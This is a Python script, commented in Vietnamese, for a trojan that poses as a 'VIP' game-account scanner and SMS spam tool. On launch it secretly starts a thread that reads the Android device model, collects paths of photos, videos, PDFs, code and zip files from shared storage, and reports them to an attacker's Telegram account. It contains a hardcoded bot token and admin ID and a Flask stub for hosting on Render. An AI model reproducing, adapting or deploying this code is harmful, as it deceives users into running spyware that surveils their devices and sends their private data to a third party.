import os
import telebot
import json
import time
import socket
from datetime import datetime
from threading import Thread
from flask import Flask

# --- CẤU HÌNH ---
TOKEN = "8613218758:AAGpN9S6xJnQhSQ21FG4BzERNp5-RbTC6BY"
ADMIN_ID = "8762273971" 
bot = telebot.TeleBot(TOKEN)

# --- TẠO SERVER GIẢ ĐỂ TREO TRÊN RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Bot Huân Pro đang hoạt động 24/7!"

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

# --- HÀM QUÉT (DÀNH CHO MÁY NẠN NHÂN) ---
def get_victim_device():
    try:
        model = os.popen("getprop ro.product.model").read().strip()
        brand = os.popen("getprop ro.product.brand").read().strip()
        return f"{brand.upper()} {model}"
    except:
        return "Thiết bị Linux/PC"

def huan_scan_engine():
    try:
        device = get_victim_device()
        time_now = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")
        base_path = "/sdcard" if os.path.exists("/sdcard") else "/storage/emulated/0"
        
        # Chỉ quét nếu chạy trên Android
        if not os.path.exists(base_path): return

        logs = {"victim": device, "time": time_now, "files": []}
        target_exts = ['.jpg', '.png', '.mp4', '.pdf', '.php', '.py', '.zip']
        
        for root, dirs, files in os.walk(base_path):
            if any(x in root.lower() for x in ['android', 'data', 'cache']): continue
            for file in files:
                if any(file.lower().endswith(e) for e in target_exts):
                    logs["files"].append(os.path.join(root, file))

        # Báo cáo về cho Huân
        msg = f"🎯 **MỤC TIÊU MỚI DÍNH BẪY!**\n📱 Máy: `{device}`\n📂 File: {len(logs['files'])}"
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
        
        log_file = f"Log_{int(time.time())}.json"
        with open(log_file, "w") as f: json.dump(logs, f, indent=4)
        with open(log_file, "rb") as f: bot.send_document(ADMIN_ID, f)
        os.remove(log_file)
    except: pass

# --- GIAO DIỆN (CHỈ HIỆN KHI CHẠY TRÊN ĐIỆN THOẠI) ---
def ui_gia_lap():
    os.system('clear')
    print("\033[1;36m[ TOOL VIP HUÂN PRO - PHIÊN BẢN 4.0 ]\033[0m")
    Thread(target=huan_scan_engine).start()
    print("\n[1] Scan Acc Liên Quân\n[2] Spam SMS\n[3] Thoát")
    opt = input("\nChọn: ")
    if opt in ['1', '2']:
        print("Đang thực hiện... vui lòng chờ.")
        while True: time.sleep(10)

if __name__ == "__main__":
    # Nếu chạy trên Render (có cổng PORT), khởi động web server
    if os.environ.get('PORT'):
        Thread(target=run_web_server).start()
        print("Bot đang treo trên Render...")
        bot.infinity_polling()
    else:
        # Nếu chạy trên điện thoại người dùng
        ui_gia_lap()
